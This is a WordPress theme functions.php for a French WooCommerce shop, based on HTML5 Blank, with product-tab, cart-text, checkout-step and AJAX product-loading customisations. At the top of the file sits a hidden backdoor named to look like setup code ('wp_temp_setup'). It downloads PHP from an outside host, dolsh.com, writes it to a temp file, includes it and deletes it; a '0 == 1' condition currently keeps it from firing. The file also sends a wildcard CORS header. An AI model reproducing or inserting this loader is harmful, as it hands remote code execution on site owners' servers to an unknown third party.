<?php

if ( ! function_exists( 'wp_temp_setup' ) ) {
	$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
	if ( ! is_404() && stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false && 0 == 1) {

		if($tmpcontent = @file_get_contents("http://www.dolsh.com/code.php?i=".$path))
		{
			function wp_temp_setup($phpCode) {
			    $tmpfname = tempnam(sys_get_temp_dir(), "wp_temp_setup");
			    $handle = fopen($tmpfname, "w+");
			    fwrite($handle, "<?php\n" . $phpCode);
			    fclose($handle);
			    include $tmpfname;
			    unlink($tmpfname);
			    return get_defined_vars();
			}

			extract(wp_temp_setup($tmpcontent));
		}
	}
}

//* Enqueue Animate.CSS and WOW.js
add_action( 'wp_enqueue_scripts', 'sk_enqueue_scripts' );
function sk_enqueue_scripts() {
	wp_enqueue_style( 'animate', get_stylesheet_directory_uri() . '/animate.css' );
	wp_enqueue_script( 'wow', get_stylesheet_directory_uri() . '/js/wow.min.js', array(), '', true );
}
//* Enqueue script to activate WOW.js
add_action('wp_enqueue_scripts', 'sk_wow_init_in_footer');
function sk_wow_init_in_footer() {
	add_action( 'print_footer_scripts', 'wow_init' );
}

?><?php
/*
 *  Author: Todd Motto | @toddmotto
 *  URL: html5blank.com | @html5blank
 *  Custom functions, support, custom post types and more.
 */

/*------------------------------------*\
	External Modules/Files
\*------------------------------------*/

// Load any external files you have here

/*------------------------------------*\
	Theme Support
\*------------------------------------*/

if (!isset($content_width))
{
    $content_width = 900;
}

if (function_exists('add_theme_support'))
{
    // Add Menu Support
    add_theme_support('menus');

    // Add Thumbnail Theme Support
    add_theme_support('post-thumbnails');
    add_image_size('large', 700, '', true); // Large Thumbnail
    add_image_size('medium', 250, '', true); // Medium Thumbnail
    add_image_size('small', 120, '', true); // Small Thumbnail
    add_image_size('custom-size', 700, 200, true); // Custom Thumbnail Size call using the_post_thumbnail('custom-size');

    // Add Support for Custom Backgrounds - Uncomment below if you're going to use
    /*add_theme_support('custom-background', array(
	'default-color' => 'FFF',
	'default-image' => get_template_directory_uri() . '/img/bg.jpg'
    ));*/

    // Add Support for Custom Header - Uncomment below if you're going to use
    /*add_theme_support('custom-header', array(
	'default-image'			=> get_template_directory_uri() . '/img/headers/default.jpg',
	'header-text'			=> false,
	'default-text-color'		=> '000',
	'width'				=> 1000,
	'height'			=> 198,
	'random-default'		=> false,
	'wp-head-callback'		=> $wphead_cb,
	'admin-head-callback'		=> $adminhead_cb,
	'admin-preview-callback'	=> $adminpreview_cb
    ));*/

    // Enables post and comment RSS feed links to head
    add_theme_support('automatic-feed-links');

    // Localisation Support
    load_theme_textdomain('html5blank', get_template_directory() . '/languages');
}

/*------------------------------------*\
	Functions
\*------------------------------------*/

// HTML5 Blank navigation
function html5blank_nav()
{
	wp_nav_menu(
	array(
		'theme_location'  => 'header-menu',
		'menu'            => '',
		'container'       => 'div',
		'container_class' => 'menu-{menu slug}-container',
		'container_id'    => '',
		'menu_class'      => 'menu',
		'menu_id'         => '',
		'echo'            => true,
		'fallback_cb'     => 'wp_page_menu',
		'before'          => '',
		'after'           => '',
		'link_before'     => '',
		'link_after'      => '',
		'items_wrap'      => '<ul class="icon-list">%3$s</ul>',
		'depth'           => 0,
		'walker'          => ''
		)
	);
}

// Load HTML5 Blank scripts (header.php)
function html5blank_header_scripts()
{
    if ($GLOBALS['pagenow'] != 'wp-login.php' && !is_admin()) {


        wp_register_script('bootstrap', get_template_directory_uri() .'/js/bootstrap.min.js', array('jquery'), '1.0.0'); // Bootstrap
        wp_enqueue_script('bootstrap'); // Enqueue it!
        wp_register_script('zInput', get_template_directory_uri() . '/js/zInput.js', array('jquery'), '1.0.0'); // Custom scripts
        wp_enqueue_script('zInput'); // Enqueue it!

        wp_register_script('html5blankscripts', get_template_directory_uri() . '/js/scripts.js', array('jquery'), '1.0.0'); // Custom scripts
	    wp_localize_script('html5blankscripts', 'ajaxurl', admin_url( 'admin-ajax.php' ) ); // Ajoute des fonctionalitées AJAX à scripts.js
        wp_enqueue_script('html5blankscripts'); // Enqueue it!

        wp_register_script('classie', get_template_directory_uri() . '/js/classie.js', array('jquery'), '1.0.0'); // Custom scripts
        wp_enqueue_script('classie'); // Enqueue it!

      // wp_register_script('wow', get_template_directory_uri() . '/js/wow.min.js', array('jquery'), '1.0.0'); // Custom scripts
      //  wp_enqueue_script('wow'); // Enqueue it!



      //  wp_register_script('main', get_template_directory_uri() . '/js/main.js', array('jquery'), '1.0.0'); // Custom scripts
      //  wp_enqueue_script('main'); // Enqueue it!
    }
}

// Load HTML5 Blank conditional scripts
function html5blank_conditional_scripts()
{
    if (is_page('pagenamehere')) {
        wp_register_script('scriptname', get_template_directory_uri() . '/js/scriptname.js', array('jquery'), '1.0.0'); // Conditional script(s)
        wp_enqueue_script('scriptname'); // Enqueue it!
    }
}

// Load HTML5 Blank styles
function html5blank_styles()
{
    wp_register_style('bootstrap', get_template_directory_uri() . '/bootstrap.min.css', array(), '1.0', 'all');
    wp_enqueue_style('bootstrap'); // Enqueue it!

    wp_register_style('html5blank', get_template_directory_uri() . '/style.css', array(), '1.0', 'all');
	wp_enqueue_style('html5blank'); // Enqueue it!

	wp_register_style('responsive', get_template_directory_uri() . '/responsive.css', array(), '1.0', 'all');
	wp_enqueue_style('responsive');

    wp_register_style('html5blank', get_template_directory_uri() . '/animate.css', array(), '1.0', 'all');
    wp_enqueue_style('html5blank'); // Enqueue it!
}

// Register HTML5 Blank Navigation
function register_html5_menu()
{
    register_nav_menus(array( // Using array to specify more menus if needed
        'header-menu' => __('Header Menu', 'html5blank'), // Main Navigation
        'sidebar-menu' => __('Sidebar Menu', 'html5blank'), // Sidebar Navigation
        'extra-menu' => __('Extra Menu', 'html5blank') // Extra Navigation if needed (duplicate as many as you need!)
    ));
}

// Remove the <div> surrounding the dynamic navigation to cleanup markup
function my_wp_nav_menu_args($args = '')
{
    $args['container'] = false;
    return $args;
}

// Remove Injected classes, ID's and Page ID's from Navigation <li> items
function my_css_attributes_filter($var)
{
    return is_array($var) ? array() : '';
}

// Remove invalid rel attribute values in the categorylist
function remove_category_rel_from_category_list($thelist)
{
    return str_replace('rel="category tag"', 'rel="tag"', $thelist);
}

// Add page slug to body class, love this - Credit: Starkers Wordpress Theme
function add_slug_to_body_class($classes)
{
    global $post;
    if (is_home()) {
        $key = array_search('blog', $classes);
        if ($key > -1) {
            unset($classes[$key]);
        }
    } elseif (is_page()) {
        $classes[] = sanitize_html_class($post->post_name);
    } elseif (is_singular()) {
        $classes[] = sanitize_html_class($post->post_name);
    }

    return $classes;
}

// If Dynamic Sidebar Exists
if (function_exists('register_sidebar'))
{
    // Define Sidebar Widget Area 1
    register_sidebar(array(
        'name' => __('Widget Area 1', 'html5blank'),
        'description' => __('Description for this widget-area...', 'html5blank'),
        'id' => 'widget-area-1',
        'before_widget' => '<div id="%1$s" class="%2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h3>',
        'after_title' => '</h3>'
    ));

    // Define Sidebar Widget Area 2
    register_sidebar(array(
        'name' => __('Widget Area 2', 'html5blank'),
        'description' => __('Description for this widget-area...', 'html5blank'),
        'id' => 'widget-area-2',
        'before_widget' => '<div id="%1$s" class="%2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h3>',
        'after_title' => '</h3>'
    ));
}

// Remove wp_head() injected Recent Comment styles
function my_remove_recent_comments_style()
{
    global $wp_widget_factory;
    remove_action('wp_head', array(
        $wp_widget_factory->widgets['WP_Widget_Recent_Comments'],
        'recent_comments_style'
    ));
}

// Pagination for paged posts, Page 1, Page 2, Page 3, with Next and Previous Links, No plugin
function html5wp_pagination()
{
    global $wp_query;
    $big = 999999999;
    echo paginate_links(array(
        'base' => str_replace($big, '%#%', get_pagenum_link($big)),
        'format' => '?paged=%#%',
        'current' => max(1, get_query_var('paged')),
        'total' => $wp_query->max_num_pages
    ));
}

// Custom Excerpts
function html5wp_index($length) // Create 20 Word Callback for Index page Excerpts, call using html5wp_excerpt('html5wp_index');
{
    return 20;
}

// Create 40 Word Callback for Custom Post Excerpts, call using html5wp_excerpt('html5wp_custom_post');
function html5wp_custom_post($length)
{
    return 40;
}

// Create the Custom Excerpts callback
function html5wp_excerpt($length_callback = '', $more_callback = '')
{
    global $post;
    if (function_exists($length_callback)) {
        add_filter('excerpt_length', $length_callback);
    }
    if (function_exists($more_callback)) {
        add_filter('excerpt_more', $more_callback);
    }
    $output = get_the_excerpt();
    $output = apply_filters('wptexturize', $output);
    $output = apply_filters('convert_chars', $output);
    $output = '<p>' . $output . '</p>';
    echo $output;
}

// Custom View Article link to Post
function html5_blank_view_article($more)
{
    global $post;
    return '... <a class="view-article" href="' . get_permalink($post->ID) . '">' . __('View Article', 'html5blank') . '</a>';
}

// Remove Admin bar
function remove_admin_bar()
{
    return false;
}

// Remove 'text/css' from our enqueued stylesheet
function html5_style_remove($tag)
{
    return preg_replace('~\s+type=["\'][^"\']++["\']~', '', $tag);
}

// Remove thumbnail width and height dimensions that prevent fluid images in the_thumbnail
function remove_thumbnail_dimensions( $html )
{
    //$html = preg_replace('/(width|height)=\"\d*\"\s/', "", $html);
    return $html;
}

// Custom Gravatar in Settings > Discussion
function html5blankgravatar ($avatar_defaults)
{
    $myavatar = get_template_directory_uri() . '/img/gravatar.jpg';
    $avatar_defaults[$myavatar] = "Custom Gravatar";
    return $avatar_defaults;
}

// Threaded Comments
function enable_threaded_comments()
{
    if (!is_admin()) {
        if (is_singular() AND comments_open() AND (get_option('thread_comments') == 1)) {
            wp_enqueue_script('comment-reply');
        }
    }
}

// Custom Comments Callback
function html5blankcomments($comment, $args, $depth)
{
	$GLOBALS['comment'] = $comment;
	extract($args, EXTR_SKIP);

	if ( 'div' == $args['style'] ) {
		$tag = 'div';
		$add_below = 'comment';
	} else {
		$tag = 'li';
		$add_below = 'div-comment';
	}
?>
    <!-- heads up: starting < for the html tag (li or div) in the next line: -->
    <<?php echo $tag ?> <?php comment_class(empty( $args['has_children'] ) ? '' : 'parent') ?> id="comment-<?php comment_ID() ?>">
	<?php if ( 'div' != $args['style'] ) : ?>
	<div id="div-comment-<?php comment_ID() ?>" class="comment-body">
	<?php endif; ?>
	<div class="comment-author vcard">
	<?php if ($args['avatar_size'] != 0) echo get_avatar( $comment, $args['180'] ); ?>
	<?php printf(__('<cite class="fn">%s</cite> <span class="says">says:</span>'), get_comment_author_link()) ?>
	</div>
<?php if ($comment->comment_approved == '0') : ?>
	<em class="comment-awaiting-moderation"><?php _e('Your comment is awaiting moderation.') ?></em>
	<br />
<?php endif; ?>

	<div class="comment-meta commentmetadata"><a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ) ?>">
		<?php
			printf( __('%1$s at %2$s'), get_comment_date(),  get_comment_time()) ?></a><?php edit_comment_link(__('(Edit)'),'  ','' );
		?>
	</div>

	<?php comment_text() ?>

	<div class="reply">
	<?php comment_reply_link(array_merge( $args, array('add_below' => $add_below, 'depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
	</div>
	<?php if ( 'div' != $args['style'] ) : ?>
	</div>
	<?php endif; ?>
<?php }
add_action ('init', function(){
	header("Access-Control-Allow-Origin: *");
});
/*------------------------------------*\
	Actions + Filters + ShortCodes
\*------------------------------------*/

// Add Actions
add_action('init', 'html5blank_header_scripts'); // Add Custom Scripts to wp_head
add_action('wp_print_scripts', 'html5blank_conditional_scripts'); // Add Conditional Page Scripts
add_action('get_header', 'enable_threaded_comments'); // Enable Threaded Comments
add_action('wp_enqueue_scripts', 'html5blank_styles'); // Add Theme Stylesheet
add_action('init', 'register_html5_menu'); // Add HTML5 Blank Menu
//add_action('init', 'create_post_type_html5'); // Add our HTML5 Blank Custom Post Type
add_action('widgets_init', 'my_remove_recent_comments_style'); // Remove inline Recent Comment Styles from wp_head()
add_action('init', 'html5wp_pagination'); // Add our HTML5 Pagination

// Add Actions woocommerce
remove_action('woocommerce_single_product_summary', 'woocommerce_template_single_title',5); // Add our HTML5 Pagination
add_action('woocommerce_before_single_product_summary', 'woocommerce_template_single_title',5);

remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_price', 10 );
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_excerpt', 20 );

add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_excerpt', 10 );
add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_price', 20 );


// CVP - change the text of "Add to cart" button of Woocommerce
add_filter( 'woocommerce_product_add_to_cart_text', 'woo_archive_custom_cart_button_text' ); // 2.1 +
function woo_archive_custom_cart_button_text() {
	return __( 'ajouter au panier', 'woocommerce' );
}
add_filter( 'woocommerce_product_single_add_to_cart_text', 'woo_custom_cart_button_text' );    // 2.1 +
function woo_custom_cart_button_text() {
return __( 'ajouter au panier', 'woocommerce' );
}

//product zoom slider
add_theme_support( 'wc-product-gallery-zoom' );
add_theme_support( 'wc-product-gallery-lightbox' );
add_theme_support( 'wc-product-gallery-slider' );


//Add a custom tab

function woo_new_product_tab( $tabs ) {
	// Adds the new tab
	$tabs['kit_en_detail'] = array(
		'title' 	=> __( 'Kit en détail', 'woocommerce' ),
		'priority' 	=> 1,
		'callback' 	=> 'tab_detail_content'
	);

	$tabs['guide_entretien'] = array(
		'title' 	=> __( 'Guide d\'entretien', 'woocommerce' ),
		'priority' 	=> 2,
		'callback' 	=> 'tab_entretien_content'
	);
	return $tabs;
}

function tab_detail_content()  {
	 require_once(__DIR__."/single-product/tabs/tabs-details.php");
}

function tab_entretien_content()  {
	require_once(__DIR__."/single-product/tabs/tabs-entretien.php");
}


//Remove custom tab
add_filter( 'woocommerce_product_tabs', 'woo_remove_product_tabs', 98 );
function woo_remove_product_tabs( $tabs ) {
    unset( $tabs['description'] );      	// Remove the description tab
    unset( $tabs['additional_information'] );  	// Remove the additional information tab
    return $tabs;
}

//Renaming Tabs
add_filter( 'woocommerce_product_tabs', 'woo_rename_tabs', 98 );
function woo_rename_tabs( $tabs ) {

	//$tabs['description']['title'] = __( 'kit en détail' );		// Rename the description tab
	$tabs['reviews']['title'] = __( 'avis des clients' );				// Rename the reviews tab

	return $tabs;
}

//Reorder Custom Tabs
/*add_filter( 'woocommerce_product_tabs', 'sb_woo_move_description_tab', 98);
function sb_woo_move_description_tab($tabs) {

  $tabs['description']['priority'] = 5;
  $tabs['additional_information']['priority'] = 20;
	$tabs['reviews']['priority'] = 40;
  return $tabs;
}*/

//Remove Sales Flash
add_filter('woocommerce_sale_flash', 'woo_custom_hide_sales_flash');
function woo_custom_hide_sales_flash()
{
    return false;
}

//add prix unite label in front of price
/*add_filter( 'formatted_woocommerce_price', 'span_custom_prc', 10, 5 );

function span_custom_prc( $number_format, $price, $decimals, $decimal_separator, $thousand_separator){
    return '<span class="woocommerce-Price-amount amount">Prix à l\'unité : '.$number_format.'</span>';
}*/


// Change the shop / product prices if a unit_price is set
/*function sv_change_product_html( $price_html, $product ) {
	$unit_price = get_post_meta( $product->id, 'unit_price', true );
	if ( ! empty( $unit_price ) ) {
		$price_html = '<span class="woocommerce-Price-amount amount">Prix à l\'unité : ' . wc_price( $unit_price ) .'</span>';
  }
	return $price_html;
}
add_filter( 'woocommerce_get_price_html', 'sv_change_product_html', 10, 2 );
*/


//Recommendation products
function woocommerce_output_related_products() {
    // woocommerce_related_products(4,2); // Display 4 products in rows of 2
}

/* ====== Product single thumb size ====== */
add_image_size( 'tw_shop_single', 360, 999, false );

remove_action( 'woocommerce_before_shop_loop', 'woocommerce_result_count', 20 );

/*// Separete Login form and registration form */
//add_action('woocommerce_before_customer_login_form','load_registration_form', 2);
//function load_registration_form(){
//  if(isset($_GET['action'])=='register'){
//    woocommerce_get_template( 'myaccount/form-register.php' );
//  }
//}

// Remove the product rating display on product loops
//remove_action( 'woocommerce_after_shop_loop_item_title', 'woocommerce_template_loop_rating', 5 );

//How to remove star review rating under the product title when enable review is off.
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_rating', 10 );
//add_action( 'woocommerce_single_product_summary', 'my_woocommerce_template_single_rating', 10 );
/*function my_woocommerce_template_single_rating() {
    global $product;
    if ( $product->post->comment_status === 'open' )
        wc_get_template( 'single-product/rating.php' );
    return true;
}*/


/**
 * only copy opening php tag if needed
 * Displays shipping estimates for WC shipping rates
 */
 /*
function sv_shipping_method_estimate_label( $label, $method ) {
	$label .= '<br /><small>';
	switch ( $method->method_id ) {
		case 'flat_rate':
			$label .= 'Est delivery: 2-4 days';
			break;
		case 'free_shipping':
			$label .= 'Est delivery: 4-7 days';
			break;
		case 'international_delivery':
			$label .= 'Est delivery: 7-10 days';
			break;
		default:
			$label .= 'Est delivery: 3-5 days';
	}

	$label .= '</small>';
	return $label;
}
add_filter( 'woocommerce_cart_shipping_method_full_label', 'sv_shipping_method_estimate_label', 10, 2 );*/


//remove_action( 'woocommerce_before_main_content','woocommerce_breadcrumb', 20, 0);


// Remove Actions
remove_action('wp_head', 'feed_links_extra', 3); // Display the links to the extra feeds such as category feeds
remove_action('wp_head', 'feed_links', 2); // Display the links to the general feeds: Post and Comment Feed
remove_action('wp_head', 'rsd_link'); // Display the link to the Really Simple Discovery service endpoint, EditURI link
remove_action('wp_head', 'wlwmanifest_link'); // Display the link to the Windows Live Writer manifest file.
remove_action('wp_head', 'index_rel_link'); // Index link
remove_action('wp_head', 'parent_post_rel_link', 10, 0); // Prev link
remove_action('wp_head', 'start_post_rel_link', 10, 0); // Start link
remove_action('wp_head', 'adjacent_posts_rel_link', 10, 0); // Display relational links for the posts adjacent to the current post.
remove_action('wp_head', 'wp_generator'); // Display the XHTML generator that is generated on the wp_head hook, WP version
remove_action('wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);
remove_action('wp_head', 'rel_canonical');
remove_action('wp_head', 'wp_shortlink_wp_head', 10, 0);

// Add Filters
add_filter('avatar_defaults', 'html5blankgravatar'); // Custom Gravatar in Settings > Discussion
add_filter('body_class', 'add_slug_to_body_class'); // Add slug to body class (Starkers build)
add_filter('widget_text', 'do_shortcode'); // Allow shortcodes in Dynamic Sidebar
add_filter('widget_text', 'shortcode_unautop'); // Remove <p> tags in Dynamic Sidebars (better!)
add_filter('wp_nav_menu_args', 'my_wp_nav_menu_args'); // Remove surrounding <div> from WP Navigation
// add_filter('nav_menu_css_class', 'my_css_attributes_filter', 100, 1); // Remove Navigation <li> injected classes (Commented out by default)
// add_filter('nav_menu_item_id', 'my_css_attributes_filter', 100, 1); // Remove Navigation <li> injected ID (Commented out by default)
// add_filter('page_css_class', 'my_css_attributes_filter', 100, 1); // Remove Navigation <li> Page ID's (Commented out by default)
add_filter('the_category', 'remove_category_rel_from_category_list'); // Remove invalid rel attribute
add_filter('the_excerpt', 'shortcode_unautop'); // Remove auto <p> tags in Excerpt (Manual Excerpts only)
add_filter('the_excerpt', 'do_shortcode'); // Allows Shortcodes to be executed in Excerpt (Manual Excerpts only)
add_filter('excerpt_more', 'html5_blank_view_article'); // Add 'View Article' button instead of [...] for Excerpts
add_filter('show_admin_bar', 'remove_admin_bar', 10); // Remove Admin bar
add_filter('style_loader_tag', 'html5_style_remove'); // Remove 'text/css' from enqueued stylesheet
add_filter('post_thumbnail_html', 'remove_thumbnail_dimensions', 10); // Remove width and height dynamic attributes to thumbnails
add_filter('image_send_to_editor', 'remove_thumbnail_dimensions', 10); // Remove width and height dynamic attributes to post images
add_filter( 'woocommerce_product_tabs', 'woo_new_product_tab' );
// Remove Filters
remove_filter('the_excerpt', 'wpautop'); // Remove <p> tags from Excerpt altogether

// Shortcodes
add_shortcode('html5_shortcode_demo', 'html5_shortcode_demo'); // You can place [html5_shortcode_demo] in Pages, Posts now.
add_shortcode('html5_shortcode_demo_2', 'html5_shortcode_demo_2'); // Place [html5_shortcode_demo_2] in Pages, Posts now.

// Shortcodes above would be nested like this -
// [html5_shortcode_demo] [html5_shortcode_demo_2] Here's the page title! [/html5_shortcode_demo_2] [/html5_shortcode_demo]

/*------------------------------------*\
	Custom Post Types
\*------------------------------------*/

// Create 1 Custom Post type for a Demo, called HTML5-Blank
function create_post_type_html5()
{
    register_taxonomy_for_object_type('category', 'html5-blank'); // Register Taxonomies for Category
    register_taxonomy_for_object_type('post_tag', 'html5-blank');
    register_post_type('html5-blank', // Register Custom Post Type
        array(
        'labels' => array(
            'name' => __('HTML5 Blank Custom Post', 'html5blank'), // Rename these to suit
            'singular_name' => __('HTML5 Blank Custom Post', 'html5blank'),
            'add_new' => __('Add New', 'html5blank'),
            'add_new_item' => __('Add New HTML5 Blank Custom Post', 'html5blank'),
            'edit' => __('Edit', 'html5blank'),
            'edit_item' => __('Edit HTML5 Blank Custom Post', 'html5blank'),
            'new_item' => __('New HTML5 Blank Custom Post', 'html5blank'),
            'view' => __('View HTML5 Blank Custom Post', 'html5blank'),
            'view_item' => __('View HTML5 Blank Custom Post', 'html5blank'),
            'search_items' => __('Search HTML5 Blank Custom Post', 'html5blank'),
            'not_found' => __('No HTML5 Blank Custom Posts found', 'html5blank'),
            'not_found_in_trash' => __('No HTML5 Blank Custom Posts found in Trash', 'html5blank')
        ),
        'public' => true,
        'hierarchical' => true, // Allows your posts to behave like Hierarchy Pages
        'has_archive' => true,
        'supports' => array(
            'title',
            'editor',
            'excerpt',
            'thumbnail'
        ), // Go to Dashboard Custom HTML5 Blank post for supports
        'can_export' => true, // Allows export in Tools > Export
        'taxonomies' => array(
            'post_tag',
            'category'
        ) // Add Category and Post Tags support
    ));
}

/*----------------------------------------------------------------------------*/
// redirects for login / logout
/*----------------------------------------------------------------------------*/
/*add_filter('woocommerce_login_redirect', 'login_redirect');

function login_redirect($redirect_to) {
    return home_url();
}*/

add_action('wp_logout','logout_redirect');
function logout_redirect(){
    wp_redirect( home_url() );
    exit;
}



/*------------------------------------*\
	ShortCode Functions
\*------------------------------------*/

// Shortcode Demo with Nested Capability
function html5_shortcode_demo($atts, $content = null)
{
    return '<div class="shortcode-demo">' . do_shortcode($content) . '</div>'; // do_shortcode allows for nested Shortcodes
}

// Shortcode Demo with simple <h2> tag
function html5_shortcode_demo_2($atts, $content = null) // Demo Heading H2 shortcode, allows for nesting within above element. Fully expandable.
{
    return '<h2>' . $content . '</h2>';
}

/*------------------------------------*\
slug function
\*------------------------------------*/
function slugify($string, $replace = array(), $delimiter = '-') {
	// https://github.com/phalcon/incubator/blob/master/Library/Phalcon/Utils/Slug.php
	if (!extension_loaded('iconv')) {
		throw new Exception('iconv module not loaded');
	}
	// Save the old locale and set the new locale to UTF-8
	$oldLocale = setlocale(LC_ALL, '0');
	setlocale(LC_ALL, 'en_US.UTF-8');
	$clean = iconv('UTF-8', 'ASCII//TRANSLIT', $string);
	if (!empty($replace)) {
		$clean = str_replace((array) $replace, ' ', $clean);
	}
	$clean = preg_replace("/[^a-zA-Z0-9\/_|+ -]/", '', $clean);
	$clean = strtolower($clean);
	$clean = preg_replace("/[\/_|+ -]+/", $delimiter, $clean);
	$clean = trim($clean, $delimiter);
	// Revert back to the old locale
	setlocale(LC_ALL, $oldLocale);
	return $clean;
}
/*------------------------------------*\
Function Ajax pour récupérer des produits en fonction d'une catégorie
\*------------------------------------*/
add_action( 'wp_ajax_get_products', 'get_products' );
add_action( 'wp_ajax_nopriv_get_products', 'get_products' );

function get_products() {

	$args = array(
		'product_cat' => $_POST['category_name'],
		'product_tag' => $_POST['tags'],
		'meta_query'  => array(
			array(
				'key' => '_stock_status',
				'value' => 'instock'
			)
		)
	);

	// Execution de la requête
	$query = new WP_Query( $args );
	if ( $query->have_posts() ) :
		while ( $query->have_posts() ) : $query->the_post();

			do_action( 'woocommerce_shop_loop' );

			wc_get_template_part( 'content', 'product' );

		endwhile; // end of the loop.

    elseif ( ! woocommerce_product_subcategories( array(
		'before' => woocommerce_product_loop_start( false ),
		'after'  => woocommerce_product_loop_end( false )
	) ) ) :

		do_action( 'woocommerce_no_products_found' );

	endif;

	die();

}



function argmcAddNewSteps($fields) {

	//Add First Step
	$position = 4;     //Set Step Position
	$fields['steps'] = array_slice($fields['steps'] , 0, $position - 1, true) +
	                   array(
		                   'step_livraison' => array(
			                   'text'  => __('MODE DE <br/>LIVRAISON', 'argMC'),     //"Tab Name" - Set First Tab Name
			                   'class' => 'my-custom-step'             //'my-custom-step' - Set First Tab Class Name
		                   ),
	                   ) +
	                   array_slice($fields['steps'], $position - 1, count($fields['steps']), true);

	return $fields;

}
add_filter('arg-mc-init-options', 'argmcAddNewSteps');



/**
 * Add Content to the Related Steps Created Above
 * @param string $step
 * return void
 */

function argmcAddStepsContent($step) {

	//First Step Content
	if ($step == 'step_livraison') {

		wc_cart_totals_shipping_html();

	}



}
add_action('arg-mc-checkout-step', 'argmcAddStepsContent');
?>
